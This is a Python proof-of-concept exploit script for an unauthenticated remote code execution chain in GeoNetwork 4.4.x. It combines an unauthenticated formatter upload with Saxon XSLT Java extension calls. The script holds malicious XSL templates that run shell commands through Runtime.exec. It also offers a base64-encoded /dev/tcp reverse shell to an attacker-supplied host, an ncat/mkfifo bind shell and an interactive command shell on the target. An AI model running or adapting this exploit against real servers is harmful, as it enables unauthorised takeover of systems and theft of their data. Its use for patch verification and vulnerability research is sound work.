#!/usr/bin/env python3
"""
GeoNetwork 4.4.x - Unauthenticated Remote Code Execution
CVE-2026-63219 (Unauth Formatter Upload) + CVE-2026-58400 (Saxon XSLT RCE)

Affected versions : GeoNetwork <= 4.4.11.0
Tested on        : GeoNetwork 4.4.11.0
Author           : Bridger (Talha Kacar)
References       : https://ethiack.com/info-hub/research/geonetwork-preauth-RCE

--- Vulnerability Chain ---

1. CVE-2026-63219: FormatterAdminApi.uploadFormatter() lacks @PreAuthorize,
   allowing unauthenticated users to upload arbitrary XSL files to:
   /var/lib/geonetwork/data/formatter/<name>/view.xsl

2. CVE-2026-58400: Saxon-HE XSLT processor is configured with
   ALLOW_EXTERNAL_FUNCTIONS=true, enabling Java class invocation
   from XSL via saxon extension namespaces (java:java.lang.Runtime etc.)

Together: upload a malicious XSL -> trigger via formatter API -> RCE.

--- Usage ---

# Command output (in-band):
python3 geonetwork_preauth_rce.py -t http://target.example.com -c "id"

# Reverse shell:
python3 geonetwork_preauth_rce.py -t http://target.example.com --shell 10.10.10.10 4444

# Bind shell:
python3 geonetwork_preauth_rce.py -t http://target.example.com --bind 9001

# Interactive pseudo-shell:
python3 geonetwork_preauth_rce.py -t http://target.example.com --interactive
"""

import requests
import argparse
import sys
import base64
import random
import string
import re
from urllib.parse import urljoin
import threading


XSLT_CMD_TEMPLATE = """\
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="2.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="java:java.lang.Runtime"
  xmlns:isr="java:java.io.InputStreamReader"
  xmlns:br="java:java.io.BufferedReader"
  extension-element-prefixes="rt isr br">
  <xsl:template match="/">
    <xsl:variable name="rt" select="rt:getRuntime()"/>
    <xsl:variable name="proc" select="rt:exec($rt, ('bash', '-c', '{CMD}'))"/>
    <xsl:variable name="is" select="proc:getInputStream($proc)"
                            xmlns:proc="java:java.lang.Process"/>
    <xsl:variable name="isr2" select="isr:new($is)"/>
    <xsl:variable name="br2" select="br:new($isr2)"/>
    <xsl:variable name="l1"  select="br:readLine($br2)"/>
    <xsl:variable name="l2"  select="br:readLine($br2)"/>
    <xsl:variable name="l3"  select="br:readLine($br2)"/>
    <xsl:variable name="l4"  select="br:readLine($br2)"/>
    <xsl:variable name="l5"  select="br:readLine($br2)"/>
    <xsl:variable name="l6"  select="br:readLine($br2)"/>
    <xsl:variable name="l7"  select="br:readLine($br2)"/>
    <xsl:variable name="l8"  select="br:readLine($br2)"/>
    <xsl:variable name="l9"  select="br:readLine($br2)"/>
    <xsl:variable name="l10" select="br:readLine($br2)"/>
    <result disable-output-escaping="yes"><xsl:value-of select="concat($l1,'&#10;',$l2,'&#10;',$l3,'&#10;',$l4,'&#10;',$l5,'&#10;',$l6,'&#10;',$l7,'&#10;',$l8,'&#10;',$l9,'&#10;',$l10)"/></result>
  </xsl:template>
</xsl:stylesheet>
"""

XSLT_SHELL_TEMPLATE = """\
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="2.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="java:java.lang.Runtime"
  extension-element-prefixes="rt">
  <xsl:template match="/">
    <xsl:variable name="rt" select="rt:getRuntime()"/>
    <xsl:variable name="proc" select="rt:exec($rt, ('bash', '-c', '{PAYLOAD}'))"/>
    <result>triggered</result>
  </xsl:template>
</xsl:stylesheet>
"""


def rand_name(prefix="poc", length=6):
    return prefix + ''.join(random.choices(string.ascii_lowercase, k=length))


def get_xsrf_token(session, base_url):
    """
    GeoNetwork uses double-submit CSRF pattern.
    GET /api/me sets XSRF-TOKEN cookie; we echo it in X-XSRF-TOKEN header.
    """
    url = urljoin(base_url, "/geonetwork/srv/api/me")
    session.get(url, headers={"Accept": "application/json"})
    token = session.cookies.get("XSRF-TOKEN")
    if not token:
        print("[-] Failed to retrieve XSRF-TOKEN")
        sys.exit(1)
    return token


def get_uuid(session, base_url, token):
    """Fetch first metadata record UUID -- required as formatter trigger target."""
    url = urljoin(base_url, "/geonetwork/srv/api/search/records/_search")
    r = session.post(
        url,
        json={"from": 0, "size": 1},
        headers={
            "Accept": "application/json",
            "Content-Type": "application/json",
            "X-XSRF-TOKEN": token,
        }
    )
    try:
        uuid = r.json()["hits"]["hits"][0]["_id"]
        return uuid
    except (KeyError, IndexError):
        print("[-] No metadata records found (empty catalog?)")
        sys.exit(1)


def upload_formatter(session, base_url, token, name, xsl_content):
    """
    CVE-2026-63219: Unauthenticated upload to /api/formatters
    Key: Accept: application/json header MUST be present, otherwise 500.
    Stored at: /var/lib/geonetwork/data/formatter/<name>/view.xsl
    """
    url = urljoin(base_url, "/geonetwork/srv/api/formatters")
    files = {
        "file": (f"{name}.xsl", xsl_content.encode(), "application/xslt+xml")
    }
    r = session.post(
        url,
        files=files,
        headers={
            "X-XSRF-TOKEN": token,
            "Accept": "application/json",   # critical
        }
    )
    return r.status_code, r.text


def trigger_formatter(session, base_url, uuid, name, timeout=10):
    """
    CVE-2026-58400: Saxon executes Java extensions from uploaded XSL.
    Saxon is configured with ALLOW_EXTERNAL_FUNCTIONS=true.
    """
    url = urljoin(base_url, f"/geonetwork/srv/api/records/{uuid}/formatters/{name}")
    try:
        r = session.get(url, headers={"Accept": "text/html"}, timeout=timeout)
        return r.status_code, r.text
    except requests.exceptions.Timeout:
        return 0, ""
    except requests.exceptions.ConnectionError:
        return 0, ""


def parse_output(raw):
    """Extract text from <result>...</result>, strip trailing empty lines."""
    match = re.search(r"<result[^>]*>(.*?)</result>", raw, re.DOTALL)
    if not match:
        return ""
    text = match.group(1)
    lines = text.splitlines()
    while lines and not lines[-1].strip():
        lines.pop()
    return "\n".join(lines)


def execute_command(session, base_url, token, uuid, cmd):
    """Upload a fresh formatter, trigger it, return stdout (up to 10 lines)."""
    name = rand_name()
    xsl = XSLT_CMD_TEMPLATE.replace("{CMD}", cmd)
    code, resp = upload_formatter(session, base_url, token, name, xsl)
    if code not in (200, 201):
        return f"[!] Upload failed ({code}): {resp}"
    code2, raw = trigger_formatter(session, base_url, uuid, name)
    if code2 != 200:
        return f"[!] Trigger failed ({code2}): {raw}"
    return parse_output(raw)


def send_bind_shell(session, base_url, token, uuid, bport):
    """
    Bind shell: target listens on bport, attacker connects.
    Tries ncat -e first, falls back to mkfifo named pipe.
    """
    payload = (
        f"ncat -lvnp {bport} -e /bin/bash 2>/dev/null || "
        f"rm -f /tmp/bp;mkfifo /tmp/bp;cat /tmp/bp|/bin/bash -i 2>&1"
        f"|nc -lvnp {bport} >/tmp/bp &"
    )
    name = rand_name("bs")
    xsl = XSLT_SHELL_TEMPLATE.replace("{PAYLOAD}", payload)
    code, resp = upload_formatter(session, base_url, token, name, xsl)
    if code not in (200, 201):
        print(f"[-] Upload failed ({code}): {resp}")
        return False
    print(f"[*] Formatter uploaded: {name}")
    print(f"[*] Triggering...")
    trigger_formatter(session, base_url, uuid, name)
    return True


def send_reverse_shell(session, base_url, token, uuid, lhost, lport):
    """
    Encode reverse shell payload as base64 to avoid XML special character issues
    with redirect operators (>& becomes &amp;& in XML).
    """
    inner = f"(bash -i >& /dev/tcp/{lhost}/{lport} 0>&1) &"
    b64 = base64.b64encode(inner.encode()).decode()
    payload = f"printf {b64}|base64 -d|bash"

    name = rand_name("rs")
    xsl = XSLT_SHELL_TEMPLATE.replace("{PAYLOAD}", payload)
    code, resp = upload_formatter(session, base_url, token, name, xsl)
    if code not in (200, 201):
        print(f"[-] Upload failed ({code}): {resp}")
        return
    print(f"[*] Formatter uploaded: {name}")
    print(f"[*] Triggering... listener should be ready on port {lport}")
    t = threading.Thread(target=trigger_formatter, args=(session, base_url, uuid, name), daemon=True)
    t.start()
    import time; time.sleep(15)


def banner():
    print("""
╔══════════════════════════════════════════════════════════════╗
║   GeoNetwork <= 4.4.11.0 -- Unauthenticated RCE              ║
║   CVE-2026-63219 (Unauth Upload) + CVE-2026-58400 (XSLT)     ║
╚══════════════════════════════════════════════════════════════╝
""")


def main():
    banner()
    parser = argparse.ArgumentParser(
        description="GeoNetwork PreAuth RCE PoC (CVE-2026-63219 + CVE-2026-58400)"
    )
    parser.add_argument("-t", "--target", required=True,
                        help="Target URL (e.g. http://target.example.com)")
    parser.add_argument("-c", "--cmd",
                        help="Command to execute (in-band output)")
    parser.add_argument("--shell", nargs=2, metavar=("LHOST", "LPORT"),
                        help="Reverse shell (e.g. --shell 192.168.1.10 4444)")
    parser.add_argument("--bind", metavar="BPORT",
                        help="Bind shell -- opens a listener on target (e.g. --bind 9001)")
    parser.add_argument("--interactive", action="store_true",
                        help="Interactive pseudo-shell mode")
    args = parser.parse_args()

    base_url = args.target.rstrip("/")
    session = requests.Session()
    session.verify = False

    print(f"[*] Target : {base_url}")
    print("[*] Fetching XSRF token...")
    token = get_xsrf_token(session, base_url)
    print(f"[+] Token  : {token}")

    print("[*] Fetching metadata UUID...")
    uuid = get_uuid(session, base_url, token)
    print(f"[+] UUID   : {uuid}")

    if args.cmd:
        print(f"[*] Command: {args.cmd}")
        out = execute_command(session, base_url, token, uuid, args.cmd)
        print("[+] Output :")
        print(out)

    elif args.bind:
        bport = args.bind
        print(f"[*] Bind shell -> target:{bport}")
        ok = send_bind_shell(session, base_url, token, uuid, bport)
        if ok:
            host = base_url.split("//")[1].split("/")[0]
            print(f"[*] Wait a few seconds, then connect:")
            print(f"    nc {host} {bport}")

    elif args.shell:
        lhost, lport = args.shell
        print(f"[*] Reverse shell -> {lhost}:{lport}")
        print(f"[!] Start your listener first: nc -lvnp {lport}")
        input("[?] Press Enter when listener is ready...")
        send_reverse_shell(session, base_url, token, uuid, lhost, lport)

    elif args.interactive:
        print("[+] Pseudo-shell started (type 'exit' to quit)\n")
        while True:
            try:
                cmd = input("geonetwork$ ").strip()
            except (EOFError, KeyboardInterrupt):
                print("\n[*] Exiting.")
                break
            if not cmd:
                continue
            if cmd.lower() in ("exit", "quit"):
                break
            out = execute_command(session, base_url, token, uuid, cmd)
            print(out)

    else:
        print("[*] Verifying RCE (id)...")
        out = execute_command(session, base_url, token, uuid, "id")
        if "uid=" in out:
            print(f"[+] RCE CONFIRMED: {out}")
        else:
            print(f"[-] Unexpected output: {out}")


if __name__ == "__main__":
    main()
